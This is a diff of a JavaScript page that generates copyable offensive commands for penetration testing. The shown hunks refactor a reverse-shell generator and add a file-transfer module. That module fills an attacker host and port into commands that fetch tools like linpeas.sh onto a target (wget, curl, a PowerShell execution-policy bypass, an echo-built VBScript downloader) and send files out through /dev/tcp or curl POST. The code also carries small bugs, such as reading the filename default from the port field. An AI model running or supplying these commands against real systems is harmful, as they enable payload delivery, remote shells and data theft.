@@ -1,34 +1,94 @@
 
-const STORAGE_KEY = 'REVSHELL_ENV'; // .lhost, .lport
+
 
 $(function () {
-  const revShell = new RevShell('#revshListener', '#revshList', {
+  let STORAGE_KEY = null;
+  let storageInfo = null;
+
+  // --- Setup reverse shell list ---
+  STORAGE_KEY = 'REVSHELL_ENV';
+  storageInfo = window.sessionStorage.getItem(STORAGE_KEY);
+  storageInfo = JSON.parse(storageInfo);
+  const revshlhost = (storageInfo && storageInfo.lhost) || '10.0.0.1';
+  const revshlport = (storageInfo && storageInfo.lport) || '4444';
+  const revShell = new RevShell('#mytoolRevShell', '#revshListener', '#revshList', {
     'LHOST': '#revshInputLHOST',
     'LPORT': '#revshInputLPORT',
     'SUBMIT': '#revshInputSubmit',
   });
+  revShell.STORAGE_KEY = STORAGE_KEY;
+  revShell.setup(revshlhost, revshlport);
+  revShell.draw(revshlhost, revshlport);
 
-  // Get LHOST and LPORT info from session storage if exists.
-  let listenInfo = window.sessionStorage.getItem(STORAGE_KEY);
-  listenInfo = JSON.parse(listenInfo);
-  const lhost = (listenInfo && listenInfo.lhost) || '10.0.0.1';
-  const lport = (listenInfo && listenInfo.lport) || '4444';
-  revShell.setup(lhost, lport);
-  revShell.draw(lhost, lport);
+  // --- Setup upload and download list ---
+  STORAGE_KEY = 'UPDOWN_ENV';
+  storageInfo = window.sessionStorage.getItem(STORAGE_KEY);
+  storageInfo = JSON.parse(storageInfo);
+  const updownlhost = (storageInfo && storageInfo.lhost) || '10.0.0.1';
+  const updownlport = (storageInfo && storageInfo.lport) || '4444';
+  const updownfilename = (storageInfo && storageInfo.lport) || 'linpeas.sh';
+  const upDown = new UpDown('#mytoolUpDown', '#updownUpList', '#updownDownList', {
+    'LHOST': '#updownInputLHOST',
+    'LPORT': '#updownInputLPORT',
+    'FILENAME': '#updownInputFILENAME',
+    'SUBMIT': '#updownInputSubmit',
+  })
+  revShell.STORAGE_KEY = STORAGE_KEY;
+  upDown.setup(updownlhost, updownlport, updownfilename);
+  upDown.draw(updownlhost, updownlport, updownfilename);
 });
 
+function setupCopyItem(CSSSelector) {
+  // コピー可能な項目はクリック時にクリップボードにコピーする。
+  $(`${CSSSelector} .copy_article`).each(function (index, element) {
+    const $revsh = $(element);
+    $revsh.mouseup(function () {
+      // 文字列範囲選択中はClickを発火させない
+      if (String(document.getSelection()).length !== 0) return false;
+      // 枠内をクリックするとコピーボタンを押下する
+      $revsh.find('.copy_input').trigger('click');
+      return false;
+    });
 
+    // Copy Button
+    const $copy_input = $revsh.find('.copy_input');
+    $copy_input.click(function () {
+      // 対象の文字列をinputに格納してからコピーする
+      const text = $revsh.find('.copy_target').text();
+      $('#input').val(text);
+      var copyText = document.querySelector("#input");
+      copyText.select();
+      document.execCommand("copy");
+      // コピー完了したらツールチップ表示
+      $(this).tooltip('show');
+      // コピー完了したら強調表示
+      $('.my-active').removeClass('my-active');
+      $revsh.addClass('my-active');
+      return false;
+    });
+    //「Copy」ボタンのツールチップ（補足説明）の設定
+    $copy_input.tooltip({trigger: 'manual'})
+      .on('shown.bs.tooltip', function () { // tooltip表示後の動作を設定
+        setTimeout((function () {
+          $(this).tooltip('hide');
+        }).bind(this), 1500);
+      });
+  });
+}
+
+// ---- Reverse Shell ----------------------------------------------------------
 class RevShell {
-  constructor(targetListenCSSSelector, targetRevshCSSSelector, inputCSSSelectors) {
+  constructor(topCSSSelector, targetListenCSSSelector, targetRevshCSSSelector, inputCSSSelectors) {
+    this.topCSSSelector          = topCSSSelector          // TOPのCSSセレクタ(ID)
     this.targetListenCSSSelector = targetListenCSSSelector // ListenリストのCSSセレクタ
     this.targetRevshCSSSelector  = targetRevshCSSSelector  // ConnectbackリストのCSSセレクタ
-    this.inputLhostCSSSelector = inputCSSSelectors.LHOST   // 入力フォームのLHOSTテキストのCSSセレクタ
-    this.inputLportCSSSelector = inputCSSSelectors.LPORT   // 入力フォームのLPORTテキストのCSSセレクタ
-    this.submitCSSSelector     = inputCSSSelectors.SUBMIT  // 入力フォームのSubmitボタンのCSSセレクタ
+    this.inputLhostCSSSelector   = inputCSSSelectors.LHOST   // 入力フォームのLHOSTのCSSセレクタ
+    this.inputLportCSSSelector   = inputCSSSelectors.LPORT   // 入力フォームのLPORTのCSSセレクタ
+    this.submitCSSSelector       = inputCSSSelectors.SUBMIT  // 入力フォームのSubmitボタンのCSSセレクタ
 
     // 1. Listen
     this.listeners = [
-      {'title': 'netcat', 'cmd': 'nc -lnvp {0}'},
+      {'title': '@Kali (netcat)', 'cmd': 'nc -lnvp {0}'},
     ]
 
     // 2. Connect back
@@ -144,7 +204,7 @@ class RevShell {
         self.draw(lhost, lport);
         // Set LHOST and LPORT info into session storage.
         const listenInfo = {'lhost': lhost, 'lport': lport};
-        window.sessionStorage.setItem(STORAGE_KEY, JSON.stringify(listenInfo));
+        window.sessionStorage.setItem(self.STORAGE_KEY, JSON.stringify(listenInfo));
       }
     }
   }
@@ -152,6 +212,7 @@ class RevShell {
   draw(lhost, lport) {
     this.drawListener(lport);
     this.drawList(lhost, lport);
+    setupCopyItem(this.topCSSSelector);
   }
 
   drawListener(lport) {
@@ -172,9 +233,7 @@ class RevShell {
             <div class="fw-bold">${title}</div>
             <code class="copy_target">${cmd}</code>
           </div>
-          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">
-            Copy
-          </button>
+          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
         </li>
         `);
     }
@@ -210,55 +269,102 @@ class RevShell {
             <div class="fw-bold">${language}</div>
             <code class="copy_target">${reverseShell}</code>
           </div>
-          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">
-            Copy
-          </button>
+          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
         </li>
         `);
       }
     }
-
-    // クリック時の処理
-    $('.copy_article').each(function (index, element) {
-      const $revsh = $(element);
-      $revsh.mouseup(function () {
-        if (String(document.getSelection()).length !== 0) {
-          return false; // 文字列範囲選択中はClickを発火させない
-        }
-        $revsh.find('.copy_input').trigger('click'); // 枠内をクリックするとコピー押下する
-        return false;
-      });
-
-      // Copy Button
-      const $copy_input = $revsh.find('.copy_input');
-      $copy_input.click(function () {
-        // 対象の文字列をinputに格納してからコピーする
-        const text = $revsh.find('.copy_target').text();
-        $('#input').val(text);
-        var copyText = document.querySelector("#input");
-        copyText.select();
-        document.execCommand("copy");
-        // コピー完了したらツールチップ表示
-        $(this).tooltip('show');
-        // コピー完了したら強調表示
-        $('.my-active').removeClass('my-active');
-        $revsh.addClass('my-active');
-        return false;
-      });
-      //「Copy」ボタンのツールチップ（補足説明）の設定
-      $copy_input
-        .tooltip({
-          trigger: 'manual'
-        })
-        // tooltip表示後の動作を設定
-        .on('shown.bs.tooltip', function () {
-          setTimeout((function () {
-            $(this).tooltip('hide');
-          }).bind(this), 1500);
-        });
-    });
   }
 }
+
+// --- Upload and Download -----------------------------------------------------
+class UpDown {
+  constructor(topCSSSelector, targetUploadCSSSelector, targetDownloadCSSSelector, inputCSSSelectors) {
+    this.topCSSSelector            = topCSSSelector            // TOPのCSSセレクタ(ID)
+    this.targetUploadCSSSelector   = targetUploadCSSSelector   // UploadリストのCSSセレクト
+    this.targetDownloadCSSSelector = targetDownloadCSSSelector // DownloadリストのCSSセレクト
+    this.inputLhostCSSSelector    = inputCSSSelectors.LHOST    // 入力フォームのLHOSTのCSSセレクタ
+    this.inputLportCSSSelector    = inputCSSSelectors.LPORT    // 入力フォームのLPORTのCSSセレクタ
+    this.inputFilenameCSSSelector = inputCSSSelectors.FILENAME // 入力フォームのFILENAMEのCSSセレクタ
+    this.submitCSSSelector        = inputCSSSelectors.SUBMIT   // 入力フォームのSubmitボタンのCSSセレクタ
+
+    // LHOST: {0}, LPORT: {1}, FILE: {2}
+    this.uploadCmds = [
+      {'title': '1. @Kali (bash)', 'cmd': 'nc -lnvp {1} < {2}'},
+      {'title': '1. cat', 'cmd': 'cat < /dev/tcp/{0}/{1} > {2}'},
+      {'title': '2. @Kali (curl, wget)', 'cmd': 'python3 -m http.server {1}'},
+      {'title': '2. wget', 'cmd': 'wget {0}:{1}/{2}'},
+      {'title': '2. curl', 'cmd': 'curl {0}:{1}/{2} -O'},
+      {'title': '2. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).DownloadFile('http://{0}:{1}/{2}', '{2}')"`},
+      {'title': '2.A. Create wget.vbs', 'cmd': `echo strUrl = WScript.Arguments.Item(0) > wget.vbs; echo StrFile = WScript.Arguments.Item(1) >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs; echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs; echo Err.Clear >> wget.vbs; echo Set http = Nothing >> wget.vbs; echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs; echo http.Open "GET", strURL, False >> wget.vbs; echo http.Send >> wget.vbs; echo varByteArray = http.ResponseBody >> wget.vbs; echo Set http = Nothing >> wget.vbs; echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs; echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs; echo strData = "" >> wget.vbs; echo strBuffer = "" >> wget.vbs; echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs; echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs; echo Next >> wget.vbs; echo ts.Close >> wget.vbs`},
+      {'title': '2.B. cscript', 'cmd': 'cscript wget.vbs http://{0}:{1}/{2} {2}'},
+    ];
+
+    // LHOST: {0}, LPORT: {1}, FILE: {2}
+    this.downloadCmds = [
+      {'title': '1. @Kali (bash)', 'cmd': 'nc -lvnp {1} > {2}'},
+      {'title': '1. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
+      {'title': '2. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py; python3 SimpleHTTPServerWithUpload.py'},
+      {'title': '2. curl', 'cmd': 'curl {0}:{1} -X POST -F file=@{2}'},
+    ];
+  }
+
+  setup(lhost, lport, filename) {
+    // Form input default value.
+    $(this.inputLhostCSSSelector).val(lhost);
+    $(this.inputLportCSSSelector).val(lport);
+    $(this.inputFilenameCSSSelector).val(filename);
+  }
+
+  draw(lhost, lport, filename) {
+    this.drawList(lhost, lport, filename);
+    setupCopyItem(this.topCSSSelector);
+  }
+
+  drawList(lhost, lport, filename) {
+    // 1. Upload
+    for (let i = 0; i < this.uploadCmds.length; i++) {
+      const uploadCmd = this.uploadCmds[i];
+      let title = uploadCmd.title;
+      let cmd = uploadCmd.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      cmd = cmd.replaceAll('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
+      // Template
+      $(this.targetUploadCSSSelector).append(`
+        <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+          <div class="ms-2 me-auto" style="width: 80%">
+            <div class="fw-bold">${title}</div>
+            <code class="copy_target">${cmd}</code>
+          </div>
+          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+        </li>
+        `);
+    }
+
+    // 2. Download
+    for (let i = 0; i < this.downloadCmds.length; i++) {
+      const downloadCmd = this.downloadCmds[i];
+      let title = downloadCmd.title;
+      let cmd = downloadCmd.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      cmd = cmd.replace('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
+      // Template
+      $(this.targetDownloadCSSSelector).append(`
+        <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+          <div class="ms-2 me-auto" style="width: 80%">
+            <div class="fw-bold">${title}</div>
+            <code class="copy_target">${cmd}</code>
+          </div>
+          <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+        </li>
+        `);
+    }
+  }
+}
+
+
 
 
 function htmlEscape(str) {
